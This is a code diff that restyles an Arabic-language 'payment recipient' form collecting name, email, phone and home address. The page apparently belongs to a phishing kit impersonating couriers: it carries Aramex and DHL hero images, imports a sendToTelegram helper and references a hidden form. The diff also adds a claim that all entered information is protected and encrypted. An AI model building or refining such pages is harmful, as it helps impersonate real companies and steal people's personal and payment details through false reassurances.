@@ -14,7 +14,8 @@ import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Package, CheckCircle2 } from "lucide-react";
+import { designSystem } from "@/lib/designSystem";
 import { PaymentPageWrapper } from "@/components/PaymentPageWrapper";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
@@ -219,40 +220,60 @@ const PaymentRecipient = () => {
           <div className="max-w-2xl mx-auto">
             
             <Card 
-              className="p-4 sm:p-8 shadow-2xl border-t-4" 
+              className="p-6 sm:p-10 border-0 backdrop-blur-sm" 
               style={{ 
-                borderTopColor: companyBranding?.colors.primary || branding.colors.primary,
-                background: companyBranding?.colors.surface || '#FFFFFF',
-                borderRadius: companyBranding?.borderRadius.lg || '12px',
-                boxShadow: companyBranding?.shadows.lg || '0 10px 15px -3px rgba(0, 0, 0, 0.1)'
+                background: 'rgba(255, 255, 255, 0.95)',
+                borderRadius: designSystem.borderRadius['2xl'],
+                boxShadow: designSystem.shadows['2xl'],
+                border: '1px solid rgba(255, 255, 255, 0.8)'
               }}
             >
               <form onSubmit={handleProceed}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 
-                    className="text-xl sm:text-3xl font-bold"
-                    style={{
-                      color: companyBranding?.colors.text || '#1A1A1A',
-                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
-                    }}
-                  >
-                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
-                  </h1>
+                <div className="flex items-center justify-between mb-8 sm:mb-10">
+                  <div>
+                    <h1 
+                      className="text-2xl sm:text-4xl font-bold mb-2"
+                      style={{
+                        color: designSystem.colors.neutral[900],
+                        fontFamily: designSystem.typography.fontFamilies.arabic,
+                        fontWeight: designSystem.typography.fontWeights.bold
+                      }}
+                    >
+                      {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
+                    </h1>
+                    <p className="text-sm sm:text-base" style={{ color: designSystem.colors.neutral[600] }}>
+                      الرجاء إدخال بياناتك للمتابعة
+                    </p>
+                  </div>
                   
                   <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    className="w-16 h-16 sm:w-24 sm:h-24 rounded-3xl flex items-center justify-center relative overflow-hidden"
                     style={{
                       background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                      boxShadow: designSystem.shadows.lg,
                     }}
                   >
-                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <Package className="w-8 h-8 sm:w-12 sm:h-12 text-white relative z-10" />
+                    <div className="absolute inset-0 bg-white opacity-10" />
                   </div>
                 </div>
 
-                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
-                  <div>
-                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
+                <div className="space-y-5 sm:space-y-6 mb-8 sm:mb-10">
+                  <div className="group">
+                    <Label 
+                      htmlFor="name" 
+                      className="flex items-center gap-2 mb-2.5 text-sm sm:text-base font-semibold"
+                      style={{ color: designSystem.colors.neutral[800] }}
+                    >
+                      <div 
+                        className="w-8 h-8 rounded-lg flex items-center justify-center"
+                        style={{ 
+                          background: `${branding.colors.primary}15`,
+                          color: branding.colors.primary 
+                        }}
+                      >
+                        <User className="w-4 h-4" />
+                      </div>
                       الاسم الكامل
                     </Label>
                     <Input
@@ -260,14 +281,31 @@ const PaymentRecipient = () => {
                       value={customerName}
                       onChange={(e) => setCustomerName(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-14 text-base border-2 transition-all duration-300"
+                      style={{
+                        borderRadius: designSystem.borderRadius.xl,
+                        borderColor: designSystem.colors.neutral[200],
+                        fontSize: designSystem.typography.fontSizes.base
+                      }}
                       placeholder="أدخل اسمك الكامل"
                     />
                   </div>
                   
-                  <div>
-                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
+                  <div className="group">
+                    <Label 
+                      htmlFor="email" 
+                      className="flex items-center gap-2 mb-2.5 text-sm sm:text-base font-semibold"
+                      style={{ color: designSystem.colors.neutral[800] }}
+                    >
+                      <div 
+                        className="w-8 h-8 rounded-lg flex items-center justify-center"
+                        style={{ 
+                          background: `${branding.colors.primary}15`,
+                          color: branding.colors.primary 
+                        }}
+                      >
+                        <Mail className="w-4 h-4" />
+                      </div>
                       البريد الإلكتروني
                     </Label>
                     <Input
@@ -276,14 +314,31 @@ const PaymentRecipient = () => {
                       value={customerEmail}
                       onChange={(e) => setCustomerEmail(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-14 text-base border-2 transition-all duration-300"
+                      style={{
+                        borderRadius: designSystem.borderRadius.xl,
+                        borderColor: designSystem.colors.neutral[200],
+                        fontSize: designSystem.typography.fontSizes.base
+                      }}
                       placeholder="example@email.com"
                     />
                   </div>
                   
-                  <div>
-                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
+                  <div className="group">
+                    <Label 
+                      htmlFor="phone" 
+                      className="flex items-center gap-2 mb-2.5 text-sm sm:text-base font-semibold"
+                      style={{ color: designSystem.colors.neutral[800] }}
+                    >
+                      <div 
+                        className="w-8 h-8 rounded-lg flex items-center justify-center"
+                        style={{ 
+                          background: `${branding.colors.primary}15`,
+                          color: branding.colors.primary 
+                        }}
+                      >
+                        <Phone className="w-4 h-4" />
+                      </div>
                       رقم الهاتف
                     </Label>
                     <Input
@@ -292,14 +347,31 @@ const PaymentRecipient = () => {
                       value={customerPhone}
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-14 text-base border-2 transition-all duration-300"
+                      style={{
+                        borderRadius: designSystem.borderRadius.xl,
+                        borderColor: designSystem.colors.neutral[200],
+                        fontSize: designSystem.typography.fontSizes.base
+                      }}
                       placeholder={`${phoneCode} ${phonePlaceholder}`}
                     />
                   </div>
                   
-                  <div>
-                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
+                  <div className="group">
+                    <Label 
+                      htmlFor="address" 
+                      className="flex items-center gap-2 mb-2.5 text-sm sm:text-base font-semibold"
+                      style={{ color: designSystem.colors.neutral[800] }}
+                    >
+                      <div 
+                        className="w-8 h-8 rounded-lg flex items-center justify-center"
+                        style={{ 
+                          background: `${branding.colors.primary}15`,
+                          color: branding.colors.primary 
+                        }}
+                      >
+                        <MapPin className="w-4 h-4" />
+                      </div>
                       العنوان السكني
                     </Label>
                     <Input
@@ -307,7 +379,12 @@ const PaymentRecipient = () => {
                       value={residentialAddress}
                       onChange={(e) => setResidentialAddress(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-14 text-base border-2 transition-all duration-300"
+                      style={{
+                        borderRadius: designSystem.borderRadius.xl,
+                        borderColor: designSystem.colors.neutral[200],
+                        fontSize: designSystem.typography.fontSizes.base
+                      }}
                       placeholder="أدخل عنوانك السكني الكامل"
                     />
                   </div>
@@ -316,21 +393,34 @@ const PaymentRecipient = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold"
+                  className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold relative overflow-hidden group border-0"
                   style={{
-                    background: companyBranding?.gradients.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-                    borderRadius: companyBranding?.borderRadius.md || '8px',
-                    boxShadow: companyBranding?.shadows.md || '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
-                    fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                    borderRadius: designSystem.borderRadius.xl,
+                    boxShadow: designSystem.shadows.lg,
+                    fontFamily: designSystem.typography.fontFamilies.arabic,
+                    transition: 'all 300ms ease'
+                  }}
+                  onMouseEnter={(e) => {
+                    e.currentTarget.style.transform = 'translateY(-2px)';
+                    e.currentTarget.style.boxShadow = designSystem.shadows.xl;
+                  }}
+                  onMouseLeave={(e) => {
+                    e.currentTarget.style.transform = 'translateY(0)';
+                    e.currentTarget.style.boxShadow = designSystem.shadows.lg;
                   }}
                 >
-                  <span className="ml-2">التالي</span>
-                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                  <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/20 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700" />
+                  <span className="ml-3 relative z-10">متابعة للدفع</span>
+                  <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2 relative z-10" />
                 </Button>
               
-                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-                  بالمتابعة، أنت توافق على الشروط والأحكام
-                </p>
+                <div className="mt-6 flex items-center justify-center gap-2 text-xs sm:text-sm" style={{ color: designSystem.colors.neutral[500] }}>
+                  <Shield className="w-4 h-4" />
+                  <p>
+                    بالمتابعة، أنت توافق على الشروط والأحكام. جميع معلوماتك محمية ومشفرة
+                  </p>
+                </div>
               </form>
               
               {/* Hidden Netlify Form */}
